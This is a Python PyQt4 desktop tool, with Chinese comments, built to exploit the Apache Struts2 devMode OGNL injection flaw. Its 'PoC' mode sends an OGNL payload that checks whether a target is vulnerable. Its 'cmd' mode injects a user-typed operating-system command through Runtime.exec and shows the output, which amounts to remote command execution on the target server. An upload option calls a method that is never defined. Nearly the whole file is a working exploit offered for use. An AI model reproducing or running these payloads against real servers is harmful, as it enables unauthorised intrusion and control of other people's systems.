# -*- coding:utf-8 -*-
import sys
from PyQt4 import QtCore, QtGui, QtWebKit
from s2devmode import Ui_MainWindow
import urllib.request
import urllib.parse
import urllib

class StartQt4(QtGui.QMainWindow):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_MainWindow() #框主题名称
        self.ui.setupUi(self) 
        QtCore.QObject.connect(self.ui.lineEdit, QtCore.SIGNAL('returnPressed()'), self.Go)
        QtCore.QObject.connect(self.ui.pushButton, QtCore.SIGNAL("clicked()"), self.Go)
        QtCore.QObject.connect(self.ui.comboBox, QtCore.SIGNAL("currentIndexChanged(int)"), self.mode)
        QtCore.QObject.connect(self.ui.pushButton_2, QtCore.SIGNAL("clicked()"), self.file_dialog)

    def PoC(self):
        payload= "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=Go!St2"
        target_url = (self.address + payload)
        #print(target_url)
        try:
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req) 
            if response:
                data = response.read()
                data = str(data, encoding = "utf-8")
                self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
        
    def cmd(self):
        self.command = str(self.ui.command.text())
        payload= "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command="
        target_url = (self.address + payload + self.command)
        #print(target_url)
        try:
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req) 
            data = response.read()
            data = str(data, encoding = "utf-8")
            self.ui.textBrowser.setText("%s命令执行结果：\n%s" %(self.command, data.rstrip())) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))

    def Go(self):
        self.address = str(self.ui.lineEdit.text())
        if self.address:
            if self.address.find('://') == -1:
               self.address = 'http://' + self.address
        if self.ui.comboBox.currentIndex() == 0:
            self.PoC()
        if self.ui.comboBox.currentIndex() == 1:
            self.cmd()
        elif self.ui.comboBox.currentIndex() == 2:
            self.upload()

    def file_dialog(self):
        fd = QtGui.QFileDialog(self)
        self.file = fd.getOpenFileName()
        from os.path import isfile
        if isfile(self.file):
            import codecs
            text = codecs.open(self.file, "r", "utf-8").read() #弹出文件选择对话框
        self.filename = str(self.ui.filename.text())
           
    def mode(self):
        self.ui.comboBox.currentIndex()
            
       
       
if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    myapp = StartQt4()
    myapp.show()
    sys.exit(app.exec_())
